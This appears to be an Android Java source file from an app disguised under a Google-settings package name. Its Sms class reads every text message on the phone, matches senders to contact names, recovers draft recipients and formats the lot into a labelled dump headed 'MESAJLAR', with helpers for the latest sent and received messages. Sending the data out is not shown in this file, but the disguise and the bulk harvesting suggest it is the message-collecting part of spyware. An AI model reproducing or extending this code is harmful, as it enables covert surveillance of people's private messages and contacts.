package com.setting.dl.google.googlesettings.phone;

import android.content.Context;
import android.database.Cursor;
import android.provider.Telephony;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.v4.content.CursorLoader;

import com.setting.dl.google.googlesettings.u;

import java.util.ArrayList;
import java.util.List;


public class Sms {
    
    private Context context;
    private Contacts contacts;
    
    private List<Message> smsList = new ArrayList<>();
    
    private static String[] SMS_COLS   =   new String[]{
            
            Telephony.Sms._ID,
            Telephony.Sms.ADDRESS,
            Telephony.Sms.PERSON,
            Telephony.Sms.DATE,
            Telephony.Sms.READ,
            Telephony.Sms.TYPE,
            Telephony.Sms.BODY,
            Telephony.Sms.SEEN,
            Telephony.Sms.THREAD_ID
    };
    
    
    public Sms(Context context){
        
        this.context = context;
        contacts = new Contacts(context);
        _getSms();
        setDraftMessagesAddress();
    }
    
    
    private void _getSms(){
        
        Cursor sms = context.getContentResolver().query(Telephony.Sms.CONTENT_URI, SMS_COLS, null, null, null);
       
        
        if(sms != null && sms.moveToFirst()){
            
            do{
                
                String id       = sms.getString(sms.getColumnIndex(Telephony.Sms._ID));
                long date       = sms.getLong(sms.getColumnIndex(Telephony.Sms.DATE));
                String type     = sms.getString(sms.getColumnIndex(Telephony.Sms.TYPE));
                String body     = sms.getString(sms.getColumnIndex(Telephony.Sms.BODY));
                String address  = sms.getString(sms.getColumnIndex(Telephony.Sms.ADDRESS));
                String person   = sms.getString(sms.getColumnIndex(Telephony.Sms.PERSON));
                String read     = sms.getString(sms.getColumnIndex(Telephony.Sms.READ));
                String seen     = sms.getString(sms.getColumnIndex(Telephony.Sms.SEEN));
                String tid      = sms.getString(sms.getColumnIndex(Telephony.Sms.THREAD_ID));
                
    
                int smsType = Integer.valueOf(type);
                
                switch (smsType) {
                    
                    case Telephony.Sms.MESSAGE_TYPE_INBOX:
                        type = "inbox";
                        break;
                    
                    case Telephony.Sms.MESSAGE_TYPE_SENT:
                        type = "sent";
                        break;
                    
                    case Telephony.Sms.MESSAGE_TYPE_DRAFT:
                        type = "draft";
                        break;
                    
                    case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                        type = "outbox";
                        break;
                    
                    case Telephony.Sms.MESSAGE_TYPE_FAILED:
                        type = "failed";
                        break;
                    
                    case Telephony.Sms.MESSAGE_TYPE_QUEUED:
                        type = "queued";
                        break;
                    
                }
                
                smsList.add(new Message(body, date, type, seen, read, person, address, id, tid, smsType));
                
            }while(sms.moveToNext());
            
            sms.close();
        }
    }
    
    public List<Message> getSmsList() {
        return smsList;
    }
    
    public class Message {
        
        private String body, type, seen, read, person, address, id, threadId;
        int intType;
        long date;
        
        Message(String body, long date, String type, String seen,
                String read, String person, String address,
                String id, String tid, int intType){
    
            this.body       = body;
            this.date       = date;
            this.type       = type;
            this.seen       = seen;
            this.read       = read;
            this.person     = person;
            this.address    = address;
            this.id         = id;
            threadId        = tid;
            this.intType    = intType;
        }
        
        
        public String getBody() {
            return body;
        }
        public long getDate() {
            return date;
        }
        public String getType() {
            return type;
        }
        public String getSeen() {
            return seen;
        }
        public String getRead() {
            return read;
        }
        public String getPerson() {
            return person;
        }
        public String getAddress() {
            return address;
        }
        public String getId() {
            return id;
        }
        public String getThreadId() {
            return threadId;
        }
        public int getIntType() {
            return intType;
        }
        public void setAddress(String address) {
            this.address = address;
        }
    }
    
    public String get(){
    
        
        StringBuilder value = new StringBuilder("||||||||||||||||||||||||||||||||||||||||||||||\n");
        value.append("              MESAJLAR\n");
        value.append("||||||||||||||||||||||||||||||||||||||||||||||\n");
    
    
        for (Message message : smsList) {
        
            value.append(saveStringSms(message));
            value.append("=========================================\n");
            value.append("=========================================\n");
        }
    
        value.append("||||||||||||||||||||||||||||||||||||||||||||||\n");
        value.append("||||||||||||||||||||||||||||||||||||||||||||||\n");
        
        return value.toString();
    }
    
    private String saveStringSms(Message message) {
        
        String name = contacts.getContactNameWithNumber(message.getAddress());
    
        return String.format("%-9s : %s\n%-9s : %s\n%-9s : %s\n%-9s : %s\n%-9s : %s\n%-9s : %s\n%-9s : %s\n%-9s : %s\n%-9s : %s\n%-9s : %s\n",
                             "Type", message.type,
                             "İsim", name,
                             "Numara", message.address,
                             "Tarih", u.getDate(message.date),
                             "Read", message.read,
                             "Seen", message.seen,
                             "id", message.id,
                             "tId", message.threadId,
                             "person", message.person,
                             "Mesaj", message.body);
    }
    
    @Nullable
    public static Message getLastSentSms(Context context) {
    
        List<Message> sentMessages = getSentMessages(context);
        int size = sentMessages.size();
        
        if(size < 1) return null;
        else if(size == 1) return sentMessages.get(0);
        
        Message lastMsg = sentMessages.get(0);
        long lastMsgTime = lastMsg.date;
    
        for (int i = 1; i < size; i++) {
            
            Message msg = sentMessages.get(i);
            
            if(msg.date > lastMsgTime) lastMsg = msg;
        }
        
        return lastMsg;
    }
    
    @Nullable
    public static Message getLastSms(Context context) {
        
        List<Message> messages = new Sms(context).getSmsList();
        int size = messages.size();
        
        if(size < 1) return null;
    
        Message lastMsg = messages.get(0);
        
        if(size == 1) return lastMsg;
        
        
        long lastMsgTime = lastMsg.date;
        
        for (int i = 1; i < size; i++) {
            
            Message msg = messages.get(i);
            
            if(msg.date > lastMsgTime) lastMsg = msg;
        }
        
        return lastMsg;
    }
    
    @NonNull
    public static List<Message> getSentMessages(Context context) {
        
        List<Message> sentMessages = new ArrayList<>();
    
        for (Message sentMsg : new Sms(context).getSmsList()){
    
            if(sentMsg.getType().equals("sent")) sentMessages.add(sentMsg);
        }
            
        return sentMessages;
    }
    
    public static List<Message> getInboxMessages(Context context) {
        
        List<Message> inboxMessages = new ArrayList<>();
        
        for (Message sentMsg : new Sms(context).getSmsList()){
            
            if(sentMsg.getType().equals("inbox")) inboxMessages.add(sentMsg);
        }
        
        return inboxMessages;
    }
    
    private void setDraftMessagesAddress() {
        
        for (int i = 0; i < smsList.size(); i++){
    
            Message message = smsList.get(i);
            
            if(message.getIntType() == Telephony.Sms.MESSAGE_TYPE_DRAFT){
    
                String address = getAddressWithThread(message.threadId);
                
                if(address != null)
                    message.setAddress(address);
            }
                
        }
    }
    
    private String getAddressWithThread(String thread) {
    
        if(thread == null) return null;
        
        CursorLoader threadAdresLoader = new CursorLoader(
                context,
                Telephony.MmsSms.CONTENT_CONVERSATIONS_URI,
                new String[]{Telephony.Sms.ADDRESS},
                Telephony.Sms.THREAD_ID +" = " + thread,
                null,
                null
        );
        
        Cursor cursorThread = threadAdresLoader.loadInBackground();
        
        String address = null;
        
        if(cursorThread != null){
    
            if (cursorThread.moveToNext()) {
    
                address = cursorThread.getString(cursorThread.getColumnIndex(Telephony.Sms.ADDRESS));
            }
        }
        
        if(address == null) return null;
    
        return Contacts.normalizeNumber(address);
        
    }
    
    
}
